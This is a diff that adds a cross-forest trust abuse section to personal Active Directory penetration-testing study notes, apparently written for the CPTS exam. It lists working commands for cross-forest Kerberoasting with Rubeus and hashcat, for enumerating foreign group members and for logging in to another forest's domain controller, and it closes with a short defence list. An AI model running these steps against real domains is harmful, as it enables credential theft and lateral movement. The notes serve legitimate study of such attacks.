@@ -558,6 +558,28 @@ raiseChild.py -target-exec <parent-dc-ip> <CHILD>/<adm>
 
 > Key idea: in a single forest, owning a **child** domain = owning the **whole forest**, because SID filtering isn't enforced internally. `raiseChild.py` automates it, but know the manual steps for the exam and for when autopwn is too risky on a client.
 
+## Cross-Forest Trust Abuse
+Across a **forest** trust, SID filtering is usually ON, so the child→parent ExtraSIDs trick doesn't apply — but these do:
+
+- **Cross-forest Kerberoasting** — request TGS for SPN accounts in the *trusting* forest (any authenticated user across the trust can):
+  ```powershell
+  Get-DomainUser -SPN -Domain <OTHER_FOREST> | select SamAccountName
+  .\Rubeus.exe kerberoast /domain:<OTHER_FOREST> /user:<svc> /nowrap
+  # hashcat -m 13100
+  ```
+- **Admin password reuse** — with a bidirectional trust, creds cracked in forest A often work in forest B (people reuse admin passwords across orgs/forests). Just test them.
+- **Foreign group membership** — accounts from one forest added to privileged groups in the other:
+  ```powershell
+  Get-DomainForeignGroupMember -Domain <OTHER_FOREST>
+  Convert-SidToName <SID>
+  Enter-PSSession -ComputerName <dc.other-forest> -Credential <THIS_FOREST>\administrator   # verify
+  ```
+- **SID history** — only abusable cross-forest when SID filtering is **disabled** (misconfig).
+
+**Defense:** enforce SID filtering on forest trusts, no password reuse across forests, audit foreign group memberships, minimize SPN exposure.
+
+> Cross-forest is more about *finding the human mistakes* — a reused admin password, an account borrowed into the other forest's admins, a Kerberoastable service account reachable across the trust — than a protocol trick, because SID filtering blocks the clean ExtraSIDs path.
+
 ## AD attack catalog (by phase — study/coverage index)
 The full menu. Commands for the core ones are in the attack-flow above; this is the map so I know what exists and when it applies. **CPTS focus = the post-access AD attacks** (credential dumping → privesc → lateral → persistence). Initial-access social/physical and Azure/cloud items are mostly red-team / cloud scope — know the names, but they're outside core CPTS.
 
